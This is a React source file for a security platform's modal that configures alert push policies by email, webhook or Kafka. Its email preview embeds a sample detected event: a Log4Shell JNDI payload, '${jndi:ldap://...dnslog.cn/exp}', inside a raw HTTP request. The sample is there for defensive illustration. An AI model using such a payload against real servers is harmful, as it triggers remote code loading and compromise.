/* eslint-disable no-param-reassign */
import { useState, useEffect, forwardRef, useImperativeHandle } from 'react'
import {
  Modal,
  Button,
  Form,
  Input,
  Radio,
  Switch,
  Row,
  Col,
  Typography,
  Spin,
  Divider,
  Space,
  Alert,
  Checkbox,
  message,
} from 'antd'
import {
  ExclamationCircleOutlined,
  MinusCircleOutlined,
  PlusCircleOutlined,
  UpOutlined,
  DownOutlined,
} from '@ant-design/icons'
import ArrowSteps from './ArrowSteps'
import InfoBlock from './InfoBlock'
import { getUsername } from '@/utils/user'
import styles from './ConfigModal.less'
import { getApps } from '@/services/assets'
import { createPushReport } from '@/services/alarmPush'
import InfiniteScroll from 'react-infinite-scroll-component'
import ProCard from '@ant-design/pro-card'
import {
  SeverityOptions,
  ConfidencesOptions,
  CategoryOptions,
  SeverityMap,
  CategoryMap,
  ConfidenceMap,
} from '@/constant/content'
import { isJSON } from '@/utils/utils'

const defaultPushSettings = {
  Severity: SeverityOptions.map(({ value }) => value),
  Category: [],
  Confidence: ConfidencesOptions.map(({ value }) => value),
}

const textMap = {
  create: '创建',
  update: '修改',
}

const eventDetails = `
Java 命名和目录接口（Java Naming and Directory Interface，缩写 JNDI），
是 Java 的一个目录服务应用程序接口（API），
它提供一个目录系统，并将服务名称与对象关联起来，
从而使得开发人员在开发过程中可以使用名称来访问对象。
攻击者部署远程恶意服务端，客户端调用恶意服务端的恶意类导致被攻击，获取系统权限

事件详情
萤火系统通过流量智能分析，如下特征匹配: ad=\${jndi:ldap://0q2y29.dnslog.cn/exp} HTTP/1.
`

const rawDetails = `
GET /hello?payload=\${jndi:ldap://0q2y29.dnslog.cn/exp} HTTP/1.1
{"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,
image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;
v=b3;q=0.9","Accept-Encoding":"gzip, deflate","Accept-Language":"zh-CN,
zh;q=0.9,en-US;q=0.8,en;q=0.7","Connection":"keep-alive","User-Agent":
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) 
AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 
Safari/537.36","Upgrade-Insecure-Requests":"1","Host":"10.22.33.157:38080"}
`

const ConfigModal = forwardRef((props, ref) => {
  const {
    type, // 'create' | 'update'
    record,
    success,
  } = props

  const [visible, setVisible] = useState(false)
  const [step, setStep] = useState(1)
  const [range, setRange] = useState('') // 'AssetAll' | 'AppRange' | 'IpRange'
  const [apps, setApps] = useState([])
  const [PageNum, setPageNum] = useState(1)
  const [PageSize, setPageSize] = useState(20)
  const [total, setTotal] = useState(0)
  const [loading, setLoading] = useState(false)
  const [checkedAppIds, setCheckedAppIds] = useState([])
  const [pushSettings, setPushSettings] = useState(defaultPushSettings)
  const [btnLoading, setBtnLoading] = useState(false)
  const [showGuide, setShowGuide] = useState(true)
  const [hasWebhook, setHasWebhook] = useState(false)
  const [hasEmail, setHasEmail] = useState(false)
  const [hasKafka, setHasKafka] = useState(false)

  const [step1Form] = Form.useForm()
  const [step2Form] = Form.useForm()

  useImperativeHandle(ref, () => ({
    setVisible,
  }))

  useEffect(() => {
    if (type !== 'update') return

    const {
      PushType,
      Name,
      AssetRange,
      Switch: isEnable,
      Frequency,
      Minutes,
      AppRange,
      IpRange,
      EmailDetail,
      HookUrl,
      Severity,
      Confidence,
      Category,
      HookInfo,
      KafkaHostString,
      KafkaTopic,
    } = record

    const step1Data = {
      SettingReportBasicInfo: {
        BasicInfo: {
          Name,
        },
        PolicySetting: {
          Range: AssetRange,
          Switch: isEnable,
          Minutes,
          Frequency,
          IpRange: IpRange?.length ? IpRange : [''],
        },
        PushMethod: {
          Push: PushType,
          Emails: EmailDetail?.length ? EmailDetail : [{ Address: '', Receiver: '' }],
          HookUrl,
          KafkaHostString,
          KafkaTopic,
        },
      },
      SettingPushContent: {
        Severity,
        Confidence,
        Category,
      },
    }

    const step2Data = {
      HookInfo: HookInfo === '{}' ? '' : HookInfo,
    }

    step1Form.setFieldsValue(step1Data)
    step2Form.setFieldsValue(step2Data)
    setCheckedAppIds(AppRange || [])
    setShowGuide(PushType.includes('WebHook'))
    setHasWebhook(PushType.includes('WebHook'))
    setHasEmail(PushType.includes('Email'))
    setHasKafka(PushType.includes('Kafka'))
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [type, record])

  useEffect(() => {
    const fetchApps = async () => {
      if (loading) return

      setLoading(true)
      const {
        Code,
        Data: { Apps, Total },
      } = await getApps({ PageNum, PageSize })
      if (Code !== 'Succeed') return

      setApps((oldApps) => [...oldApps, ...Apps])
      setTotal(Total)
      setLoading(false)
    }

    fetchApps()
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [PageNum, PageSize])

  const handleCancel = () => {
    Modal.confirm({
      title: `取消${textMap[type]}告警推送？`,
      icon: <ExclamationCircleOutlined />,
      style: {
        top: 150,
      },
      okText: `取消${textMap[type]}`,
      cancelText: `继续${textMap[type]}`,
      okButtonProps: {
        type: 'default',
      },
      cancelButtonProps: {
        type: 'primary',
      },
      onOk() {
        setVisible(false)
        step1Form.resetFields()
        step2Form.resetFields()
        setCheckedAppIds([])
        setHasKafka(false)

        setTimeout(() => {
          setStep(1)
        }, 300)
      },
    })
  }

  /**
   * 保存 或 保存并发送测试数据
   * @param {string} TaskStatus 告警任务状态 待启用 - ToEnable  已禁用 - Disabled 启用中 - Enabling
   */
  const onSend = (TaskStatus) => {
    setBtnLoading(true)
    step2Form
      .validateFields()
      .then(async ({ HookInfo }) => {
        const step1Data = step1Form.getFieldsValue(true)

        step1Data.SettingPushContent.TaskStatus = TaskStatus
        step1Data.SettingReportBasicInfo.BasicInfo.Creator = getUsername()
        step1Data.SettingReportBasicInfo.PolicySetting.AppRange = checkedAppIds
        step1Data.SettingReportBasicInfo.PolicySetting.IpRange =
          step1Data.SettingReportBasicInfo.PolicySetting.IpRange?.filter((e) => !!e) || []
        step1Data.SettingReportBasicInfo.PushMethod.Emails =
          step1Data.SettingReportBasicInfo.PushMethod.Emails?.filter(
            ({ Address, Receiver }) => Address && Receiver,
          ) || []

        step1Data.SettingReportBasicInfo.PushMethod.HookInfo = isJSON(HookInfo)
          ? JSON.parse(HookInfo)
          : {}

        const postData = {
          ...step1Data,
          ReportId: type === 'create' ? '' : record.ReportId, // 空字符串，则为创建操作，有id值则为更新操作
        }

        const { Code } = await createPushReport(postData)
        if (Code !== 'Succeed') return

        message.success(`${textMap[type]}告警推送成功!`)
        setVisible(false)
        success()
        step1Form.resetFields()
        step2Form.resetFields()
        setCheckedAppIds([])
        setHasKafka(false)
        setStep(1)
        setBtnLoading(false)
      })
      .catch((err) => {
        console.log(err)
        setBtnLoading(false)
      })
  }

  const footer = {
    step1: [
      <Button key="first-cancel" onClick={handleCancel}>
        取消
      </Button>,
      <Button
        key="first-next"
        type="primary"
        onClick={() => {
          step1Form
            .validateFields()
            .then(() => {
              setStep(2)
            })
            .catch((err) => console.log(err))
        }}
      >
        下一步
      </Button>,
    ],
    step2: [
      <Button
        key="second-prev"
        onClick={() => {
          setStep(1)
        }}
      >
        上一步
      </Button>,
      <Button key="second-cancel" onClick={handleCancel}>
        取消
      </Button>,
      <Button key="second-save" loading={btnLoading} onClick={() => onSend('ToEnable')}>
        保存
      </Button>,
      <Button
        key="second-save-send"
        loading={btnLoading}
        type="primary"
        onClick={() => onSend('Enabling')}
      >
        保存&发送测试数据
      </Button>,
    ],
  }

  const onStep1FormValuesChange = (vals, allVals) => {
    const Range = vals?.SettingReportBasicInfo?.PolicySetting?.Range
    if (Range) {
      setRange(Range)
    }

    const Push = allVals?.SettingReportBasicInfo?.PushMethod?.Push
    if (Array.isArray(Push)) {
      const isWebhookChecked = Push.includes('WebHook')
      setHasWebhook(isWebhookChecked)
      setShowGuide(isWebhookChecked)
      setHasEmail(Push.includes('Email'))
      setHasKafka(Push.includes('Kafka'))
    }

    setPushSettings(allVals.SettingPushContent)
  }

  const onAppItemClick = (appId) => {
    const i = checkedAppIds.findIndex((id) => id === appId)

    if (i === -1) {
      setCheckedAppIds((ids) => [...ids, appId])
    } else {
      setCheckedAppIds((ids) => ids.filter((e) => e !== appId))
    }
  }

  const loadMoreData = () => {
    setPageNum(PageNum + 1)
  }

  // 应用范畴详情
  const appRangeDetails = (
    <Form.Item
      name={['SettingReportBasicInfo', 'PolicySetting', 'AppRange']}
      rules={[
        {
          validator: () =>
            checkedAppIds.length ? Promise.resolve() : Promise.reject(new Error('请选择应用')),
        },
      ]}
      wrapperCol={{
        offset: 6,
        span: 18,
      }}
    >
      {!total ? (
        <Alert
          message="您当前尚未创建应用，您可在 资产管理-API资产 管理页内创建应用!"
          type="warning"
          showIcon
        />
      ) : (
        <div className={styles.appsCard} id="scrollableDiv">
          <InfiniteScroll
            dataLength={apps.length}
            next={loadMoreData}
            hasMore={apps.length < total}
            loader={
              <div style={{ textAlign: 'center' }}>
                <Spin size="small" />
              </div>
            }
            endMessage={
              <Divider plain style={{ color: '#ccc', fontSize: 12, margin: '10px 0' }}>
                应用加载完成
              </Divider>
            }
            scrollableTarget="scrollableDiv"
          >
            <Row gutter={[8, 8]} style={{ width: '100%', padding: 12 }}>
              {apps.map(({ AppId, Name }) => (
                <Col key={AppId} span={6}>
                  <div
                    className={`${styles.appItem} ${
                      checkedAppIds.includes(AppId) ? styles.appItemChecked : ''
                    }`}
                    onClick={() => onAppItemClick(AppId)}
                  >
                    <Typography.Text
                      style={{
                        maxWidth: '100%',
                      }}
                      ellipsis={{ tooltip: Name }}
                    >
                      {Name}
                    </Typography.Text>
                  </div>
                </Col>
              ))}
            </Row>
          </InfiniteScroll>
        </div>
      )}
    </Form.Item>
  )

  // IP范围详情
  const ipRangeDetails = (
    <Form.List name={['SettingReportBasicInfo', 'PolicySetting', 'IpRange']} initialValue={['']}>
      {(fields, { add, remove }, { errors }) => (
        <>
          {fields.map((field, index) => (
            <Form.Item
              wrapperCol={{
                offset: 6,
                span: 18,
              }}
              key={field.key}
            >
              <Form.Item
                {...field}
                validateTrigger={['onChange', 'onBlur']}
                rules={[
                  {
                    required: true,
                    whitespace: true,
                    message: '请输入IP范围或删除此字段',
                  },
                ]}
                noStyle
              >
                <Input placeholder="例如: 192.188.222.0/24" style={{ width: 236 }} />
              </Form.Item>
              <Space style={{ marginLeft: 6 }}>
                <PlusCircleOutlined
                  className={styles.dynamicButton}
                  style={{ color: 'green' }}
                  onClick={() => add('')}
                />
                {fields.length > 1 ? (
                  <MinusCircleOutlined
                    className={styles.dynamicButton}
                    style={{ color: 'red' }}
                    onClick={() => remove(field.name)}
                  />
                ) : null}
              </Space>
            </Form.Item>
          ))}
        </>
      )}
    </Form.List>
  )

  const getRangeDetails = () => {
    if (range === 'IpRange') return ipRangeDetails
    if (range === 'AppRange') return appRangeDetails
    return null
  }

  const disabledProp = {
    disabled: hasKafka,
  }

  const onPushTypeChange = (vals) => {
    if (vals && vals.includes('Kafka')) {
      // 当选择了 Kafka 就将表单设置为特殊状态（配置、事件类型全选）
      step1Form.setFieldsValue({
        SettingReportBasicInfo: {
          PolicySetting: {
            Range: 'AssetAll',
          },
          PushMethod: {
            Push: ['Kafka'],
          },
        },
        SettingPushContent: {
          Severity: SeverityOptions.map(({ value }) => value),
          Category: CategoryOptions.map(({ value }) => value),
          Confidence: ConfidencesOptions.map(({ value }) => value),
        },
      })

      setRange('AssetAll')
      setHasWebhook(false)
      setShowGuide(false)
      setHasEmail(false)
    }
  }

  // 步骤一内容
  const stepFirstContent = (
    <div>
      <ArrowSteps
        items={[{ title: '设置报告基础信息', active: true }, { title: '预览' }]}
        style={{ marginBottom: 20 }}
      />
      <Form
        name="step-first-form"
        labelCol={{ span: 6 }}
        wrapperCol={{ span: 18 }}
        labelAlign="left"
        form={step1Form}
        scrollToFirstError
        requiredMark={false}
        autoComplete="off"
        onValuesChange={onStep1FormValuesChange}
        initialValues={{
          SettingReportBasicInfo: {
            PolicySetting: {
              Range: 'AssetAll',
            },
          },
          SettingPushContent: defaultPushSettings,
        }}
      >
        <InfoBlock title="基础信息">
          <Form.Item
            name={['SettingReportBasicInfo', 'BasicInfo', 'Name']}
            label="策略名称"
            rules={[{ required: true, message: '此项为必填项' }]}
            style={{ marginBottom: 8 }}
          >
            <Input style={{ width: 300 }} allowClear placeholder="请输入策略名称" />
          </Form.Item>
          <Form.Item label="创建者" style={{ marginBottom: 8 }}>
            <span style={{ color: '#666' }}>{getUsername()}</span>
          </Form.Item>
        </InfoBlock>
        <InfoBlock title="策略配置">
          <Form.Item
            name={['SettingReportBasicInfo', 'PolicySetting', 'Range']}
            label="监控范畴"
            rules={[
              {
                required: true,
                message: '请选择监控范畴',
              },
            ]}
            style={{ marginBottom: 8 }}
          >
            <Radio.Group {...disabledProp}>
              <Radio value="AssetAll">所有资产</Radio>
              <Radio value="AppRange">应用范畴</Radio>
              <Radio value="IpRange">指定IP范围</Radio>
            </Radio.Group>
          </Form.Item>
          <Form.Item noStyle>{getRangeDetails()}</Form.Item>
        </InfoBlock>
        <InfoBlock title="监控事件选择">
          <Form.Item
            name={['SettingPushContent', 'Severity']}
            label="风险等级"
            rules={[
              {
                required: true,
                message: '请选择风险等级',
              },
            ]}
            style={{ marginBottom: 8 }}
          >
            <Checkbox.Group style={{ width: '100%' }} {...disabledProp}>
              <Row>
                {SeverityOptions.map(({ value, label }) => (
                  <Col span={6} key={value}>
                    <Checkbox value={value} style={{ lineHeight: '32px' }}>
                      {label}
                    </Checkbox>
                  </Col>
                ))}
              </Row>
            </Checkbox.Group>
          </Form.Item>
          <Form.Item
            name={['SettingPushContent', 'Category']}
            label="风险类别"
            rules={[
              {
                required: true,
                message: '请选择风险类型',
              },
            ]}
            style={{ marginBottom: 8 }}
          >
            <Checkbox.Group style={{ width: '100%' }} {...disabledProp}>
              <Row>
                {CategoryOptions.map(({ value, label }) => (
                  <Col span={6} key={value}>
                    <Checkbox value={value} style={{ lineHeight: '32px' }}>
                      {label}
                    </Checkbox>
                  </Col>
                ))}
              </Row>
            </Checkbox.Group>
          </Form.Item>
          <Form.Item
            name={['SettingPushContent', 'Confidence']}
            label="风险准确度"
            rules={[
              {
                required: true,
                message: '请选择风险准确度',
              },
            ]}
            style={{ marginBottom: 8 }}
          >
            <Checkbox.Group style={{ width: '100%' }} {...disabledProp}>
              <Row>
                {ConfidencesOptions.map(({ value, label }) => (
                  <Col span={6} key={value}>
                    <Checkbox value={value} style={{ lineHeight: '32px' }}>
                      {label}
                    </Checkbox>
                  </Col>
                ))}
              </Row>
            </Checkbox.Group>
          </Form.Item>
          <Form.Item label="风险内容" style={{ marginBottom: 8 }}>
            <Checkbox.Group
              style={{ width: '100%' }}
              disabled
              defaultValue={['title', 'info', 'raw']}
            >
              <Row>
                <Col span={6}>
                  <Checkbox value="title" style={{ lineHeight: '32px' }}>
                    事件标题
                  </Checkbox>
                </Col>
                <Col span={6}>
                  <Checkbox value="info" style={{ lineHeight: '32px' }}>
                    事件信息
                  </Checkbox>
                </Col>
                <Col span={6}>
                  <Checkbox value="raw" style={{ lineHeight: '32px' }}>
                    原始报文
                  </Checkbox>
                </Col>
              </Row>
            </Checkbox.Group>
          </Form.Item>
        </InfoBlock>
        <InfoBlock title="推送方式">
          <Form.Item
            labelCol={{ span: 0 }}
            wrapperCol={{ span: 24 }}
            name={['SettingReportBasicInfo', 'PushMethod', 'Push']}
            rules={[
              {
                required: true,
                message: '请选择推送方式',
              },
            ]}
            style={{ marginBottom: 0 }}
          >
            <Checkbox.Group style={{ width: '100%' }} onChange={onPushTypeChange}>
              <div>
                <Checkbox value="Email" style={{ marginBottom: 8 }} {...disabledProp}>
                  邮件通知
                </Checkbox>
                <Form.Item
                  label="发送频次"
                  labelCol={{ span: 6 }}
                  wrapperCol={{ span: 18 }}
                  extra={<div>*默认配置为60min一次</div>}
                  style={{ marginBottom: 8 }}
                >
                  <Form.Item
                    name={['SettingReportBasicInfo', 'PolicySetting', 'Switch']}
                    valuePropName="checked"
                    style={{ display: 'inline-block', marginRight: 16, marginBottom: 8 }}
                  >
                    <Switch {...disabledProp} />
                  </Form.Item>
                  <Form.Item
                    name={['SettingReportBasicInfo', 'PolicySetting', 'Minutes']}
                    // rules={[{ required: true, message: '此项必填' }]}
                    style={{
                      display: 'inline-block',
                      width: 130,
                      marginRight: 16,
                      marginBottom: 8,
                    }}
                  >
                    <Input placeholder="请输入数字" suffix="分钟" {...disabledProp} />
                  </Form.Item>
                  <Form.Item
                    name={['SettingReportBasicInfo', 'PolicySetting', 'Frequency']}
                    // rules={[{ required: true, message: '此项必填' }]}
                    style={{ display: 'inline-block', width: 130, marginBottom: 8 }}
                  >
                    <Input placeholder="请输入数字" suffix="次" {...disabledProp} />
                  </Form.Item>
                </Form.Item>
                <Form.List
                  name={['SettingReportBasicInfo', 'PushMethod', 'Emails']}
                  initialValue={[{ Address: '', Receiver: '' }]}
                >
                  {(fields, { add, remove }) => (
                    <>
                      {fields.map(({ key, name, ...restField }, index) => (
                        <Form.Item
                          {...(index === 0
                            ? {
                                labelCol: { span: 6 },
                                wrapperCol: { span: 18 },
                              }
                            : {
                                wrapperCol: {
                                  offset: 6,
                                  span: 18,
                                },
                              })}
                          label={index === 0 ? '邮箱地址/收件人姓名' : ''}
                          required={false}
                          key={key}
                          style={{ marginBottom: 0 }}
                        >
                          <Space style={{ display: 'flex' }} align="baseline">
                            <Form.Item
                              {...restField}
                              name={[name, 'Address']}
                              rules={[
                                ({ getFieldValue }) => ({
                                  validator(_, value) {
                                    if (
                                      !getFieldValue([
                                        'SettingReportBasicInfo',
                                        'PushMethod',
                                        'Push',
                                      ])?.includes('Email')
                                    )
                                      return Promise.resolve()

                                    if (value?.trim()) return Promise.resolve()
                                    return Promise.reject(new Error('请填写邮箱地址'))
                                  },
                                }),
                              ]}
                              style={{ marginBottom: 8 }}
                            >
                              <Input
                                placeholder="邮箱地址"
                                style={{ width: 250 }}
                                {...disabledProp}
                              />
                            </Form.Item>
                            <Form.Item
                              {...restField}
                              name={[name, 'Receiver']}
                              rules={[
                                ({ getFieldValue }) => ({
                                  validator(_, value) {
                                    if (
                                      !getFieldValue([
                                        'SettingReportBasicInfo',
                                        'PushMethod',
                                        'Push',
                                      ])?.includes('Email')
                                    )
                                      return Promise.resolve()

                                    if (value?.trim()) return Promise.resolve()
                                    return Promise.reject(new Error('请填写收件人姓名'))
                                  },
                                }),
                              ]}
                              style={{ marginBottom: 8 }}
                            >
                              <Input
                                placeholder="收件人"
                                style={{ width: 150 }}
                                {...disabledProp}
                              />
                            </Form.Item>
                            <Space style={{ marginLeft: 6 }}>
                              <PlusCircleOutlined
                                className={styles.dynamicButton}
                                style={{ color: 'green' }}
                                onClick={() => add({ Address: '', Receiver: '' })}
                              />
                              {fields.length > 1 ? (
                                <MinusCircleOutlined
                                  className={styles.dynamicButton}
                                  style={{ color: 'red' }}
                                  onClick={() => remove(name)}
                                />
                              ) : null}
                            </Space>
                          </Space>
                        </Form.Item>
                      ))}
                    </>
                  )}
                </Form.List>
              </div>
              <div>
                <Checkbox value="WebHook" style={{ marginBottom: 8 }} {...disabledProp}>
                  Webhook
                </Checkbox>
                <Form.Item
                  name={['SettingReportBasicInfo', 'PushMethod', 'HookUrl']}
                  label="Webhook 地址"
                  labelCol={{ span: 6 }}
                  wrapperCol={{ span: 18 }}
                  rules={[
                    ({ getFieldValue }) => ({
                      validator(_, value) {
                        if (
                          !getFieldValue([
                            'SettingReportBasicInfo',
                            'PushMethod',
                            'Push',
                          ])?.includes('WebHook')
                        )
                          return Promise.resolve()

                        if (value?.trim()) return Promise.resolve()
                        return Promise.reject(new Error('请填写Webhook地址'))
                      },
                    }),
                  ]}
                >
                  <Input style={{ width: 350 }} placeholder="请输入Webhook地址" {...disabledProp} />
                </Form.Item>
              </div>
              <div>
                <Checkbox value="Kafka" style={{ marginBottom: 8 }}>
                  推送到 Kafka
                </Checkbox>
                <Form.Item
                  name={['SettingReportBasicInfo', 'PushMethod', 'KafkaHostString']}
                  label="Kafka 地址"
                  labelCol={{ span: 6 }}
                  wrapperCol={{ span: 18 }}
                  rules={[
                    ({ getFieldValue }) => ({
                      validator(_, value) {
                        if (
                          !getFieldValue([
                            'SettingReportBasicInfo',
                            'PushMethod',
                            'Push',
                          ])?.includes('Kafka')
                        )
                          return Promise.resolve()

                        if (value?.trim()) return Promise.resolve()
                        return Promise.reject(new Error('请填写Kafka地址'))
                      },
                    }),
                  ]}
                >
                  <Input style={{ width: 350 }} placeholder="请输入Kafka地址" />
                </Form.Item>
                <Form.Item
                  name={['SettingReportBasicInfo', 'PushMethod', 'KafkaTopic']}
                  label="Topic"
                  labelCol={{ span: 6 }}
                  wrapperCol={{ span: 18 }}
                  rules={[
                    ({ getFieldValue }) => ({
                      validator(_, value) {
                        if (
                          !getFieldValue([
                            'SettingReportBasicInfo',
                            'PushMethod',
                            'Push',
                          ])?.includes('Kafka')
                        )
                          return Promise.resolve()

                        if (value?.trim()) return Promise.resolve()
                        return Promise.reject(new Error('请填写Topic'))
                      },
                    }),
                  ]}
                >
                  <Input style={{ width: 350 }} placeholder="请输入Topic" />
                </Form.Item>
              </div>
            </Checkbox.Group>
          </Form.Item>
        </InfoBlock>
      </Form>
    </div>
  )

  // 步骤二内容
  const stepSecondContent = (
    <div>
      <ArrowSteps
        items={[
          { title: '设置报告基础信息', active: true },
          { title: '预览', active: true },
        ]}
        style={{ marginBottom: 16 }}
      />
      <ProCard
        title={<div style={{ fontSize: 14, fontWeight: 500 }}>邮件预览</div>}
        headerBordered
        bordered
        headStyle={{ padding: 16 }}
        bodyStyle={{ padding: 16 }}
      >
        {hasEmail ? (
          <div>
            <div className={styles.emailTitle}>标题:【萤火API智能分析平台】检测到xx个风险事件</div>
            <div>
              <p>
                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;萤火API智能安全分析平台于 2022-01-02 16:00:00 -
                17:00:12 检测到 x个高风险，x个中风险，x个低风险，x个提醒，具体情况如下:
              </p>
              <div style={{ paddingLeft: 20, marginBottom: 8 }}>
                <Row style={{ marginBottom: 8 }}>
                  <Col span={6}>业务名/IP :</Col>
                  <Col span={18}>xx业务</Col>
                </Row>
                <Row style={{ marginBottom: 8 }}>
                  <Col span={6}>事件名 :</Col>
                  <Col span={18}>SQL注入 (例)</Col>
                </Row>
                <Row style={{ marginBottom: 8 }}>
                  <Col span={6}>风险等级 :</Col>
                  <Col span={18}>{pushSettings.Severity.map((k) => SeverityMap[k]).join('、')}</Col>
                </Row>
                <Row style={{ marginBottom: 8 }}>
                  <Col span={6}>风险类别 :</Col>
                  <Col span={18}>{pushSettings.Category.map((k) => CategoryMap[k]).join('、')}</Col>
                </Row>
                <Row style={{ marginBottom: 8 }}>
                  <Col span={6}>风险准确度 :</Col>
                  <Col span={18}>
                    {pushSettings.Confidence.map((k) => ConfidenceMap[k]).join('、')}
                  </Col>
                </Row>
                <Row style={{ marginBottom: 8 }}>
                  <Col span={6}>事件信息 :</Col>
                  <Col span={18}>
                    <Typography.Text
                      style={{
                        maxWidth: '100%',
                      }}
                      ellipsis={{ tooltip: eventDetails }}
                    >
                      {eventDetails}
                    </Typography.Text>
                  </Col>
                </Row>
                <Row style={{ marginBottom: 8 }}>
                  <Col span={6}>原始报文 :</Col>
                  <Col span={18}>
                    <Typography.Text
                      style={{
                        maxWidth: '100%',
                      }}
                      ellipsis={{ tooltip: rawDetails }}
                    >
                      {rawDetails}
                    </Typography.Text>
                  </Col>
                </Row>
                <Row style={{ marginBottom: 8 }}>
                  <Col span={6}>风险情况举证 :</Col>
                  <Col span={18}>已有数据证明已失陷，同时存在对内网发起横向攻击行为</Col>
                </Row>
              </div>
              <b>
                已为您在每个业务的详情页面汇总了所有高风险问题和处理建议，建议登录「萤火API智能分析平台」进行处理，避免业务遭受影响
              </b>
            </div>
          </div>
        ) : (
          <div style={{ color: '#ccc' }}>您未选择邮件通知推送方式</div>
        )}
        <Divider
          style={{
            width: 'calc(100% + 32px)',
            marginTop: 12,
            marginBottom: 12,
            marginLeft: -16,
            marginRight: -16,
          }}
        />
        <div className={styles.hookTitle}>Webhook 配置</div>
        <div className={styles.guideWrapper}>
          <Button
            type="link"
            size="small"
            style={{ padding: 0 }}
            onClick={() => setShowGuide(!showGuide)}
          >
            必读说明
            {showGuide ? <UpOutlined /> : <DownOutlined />}
          </Button>
          {showGuide && (
            <div className={styles.guideContent}>
              1. 当前仅支持 <Typography.Text code>JSON</Typography.Text> 格式
              <br />
              2. <Typography.Text code>JSON</Typography.Text> 格式支持自定义
              <br />
              3. 须在 <Typography.Text code>JSON</Typography.Text> 的内容中配置如下风险信息:
              <ul>
                <li>
                  <span>业务名/IP:</span>
                  <Typography.Paragraph copyable={{ text: '{{ WebHookSchema.AppName }}' }}>
                    <Typography.Text code>{'{{ WebHookSchema.AppName }}'}</Typography.Text>
                  </Typography.Paragraph>
                </li>
                <li>
                  <span>事件名:</span>
                  <Typography.Paragraph copyable={{ text: '{{ WebHookSchema.EventName }}' }}>
                    <Typography.Text code>{'{{ WebHookSchema.EventName }}'}</Typography.Text>
                  </Typography.Paragraph>
                </li>
                <li>
                  <span>风险等级:</span>
                  <Typography.Paragraph copyable={{ text: '{{ WebHookSchema.Severity }}' }}>
                    <Typography.Text code>{'{{ WebHookSchema.Severity }}'}</Typography.Text>
                  </Typography.Paragraph>
                </li>
                <li>
                  <span>风险准确度:</span>
                  <Typography.Paragraph copyable={{ text: '{{ WebHookSchema.Confidence }}' }}>
                    <Typography.Text code>{'{{ WebHookSchema.Confidence }}'}</Typography.Text>
                  </Typography.Paragraph>
                </li>
                <li>
                  <span>事件信息:</span>
                  <Typography.Paragraph copyable={{ text: '{{ WebHookSchema.Description }}' }}>
                    <Typography.Text code>{'{{ WebHookSchema.Description }}'}</Typography.Text>
                  </Typography.Paragraph>
                </li>
                <li>
                  <span>原始报文Request:</span>
                  <Typography.Paragraph copyable={{ text: '{{ WebHookSchema.Request }}' }}>
                    <Typography.Text code>{'{{ WebHookSchema.Request }}'}</Typography.Text>
                  </Typography.Paragraph>
                </li>
                <li>
                  <span>原始报文Response:</span>
                  <Typography.Paragraph copyable={{ text: '{{ WebHookSchema.Response }}' }}>
                    <Typography.Text code>{'{{ WebHookSchema.Response }}'}</Typography.Text>
                  </Typography.Paragraph>
                </li>
              </ul>
            </div>
          )}
        </div>
        <Form name="step-second-form" form={step2Form}>
          <Form.Item
            name="HookInfo"
            validateTrigger="onBlur"
            rules={[
              {
                validator(_, val) {
                  if (
                    !step1Form
                      .getFieldValue(['SettingReportBasicInfo', 'PushMethod', 'Push'])
                      ?.includes('WebHook')
                  )
                    return Promise.resolve()

                  if (isJSON(val)) return Promise.resolve()
                  return Promise.reject(new Error('JSON 格式不合法'))
                },
              },
            ]}
          >
            <Input.TextArea
              allowClear
              autoSize={{ minRows: 4, maxRows: 8 }}
              className={styles.jsonInputor}
              placeholder="请输入 JSON 格式字符串"
              disabled={!hasWebhook}
            />
          </Form.Item>
        </Form>
        {hasKafka && (
          <div>
            <Divider
              style={{
                width: 'calc(100% + 32px)',
                marginTop: 12,
                marginBottom: 12,
                marginLeft: -16,
                marginRight: -16,
              }}
            />
            <div style={{ marginBottom: 2 }}>
              <span style={{ display: 'inline-block', width: 100, fontWeight: 500 }}>
                Kafka 地址 :
              </span>
              <span>
                {step1Form.getFieldValue([
                  'SettingReportBasicInfo',
                  'PushMethod',
                  'KafkaHostString',
                ])}
              </span>
            </div>
            <div>
              <span style={{ display: 'inline-block', width: 100, fontWeight: 500 }}>Topic :</span>
              <span>
                {step1Form.getFieldValue(['SettingReportBasicInfo', 'PushMethod', 'KafkaTopic'])}
              </span>
            </div>
          </div>
        )}
      </ProCard>
    </div>
  )

  const content = {
    step1: stepFirstContent,
    step2: stepSecondContent,
  }

  return (
    <Modal
      title={type === 'create' ? '创建告警推送策略' : '修改告警推送策略'}
      width={720}
      visible={visible}
      maskClosable={false}
      footer={footer[`step${step}`]}
      bodyStyle={{ paddingTop: 20 }}
      onCancel={handleCancel}
    >
      {content[`step${step}`]}
    </Modal>
  )
})

export default ConfigModal
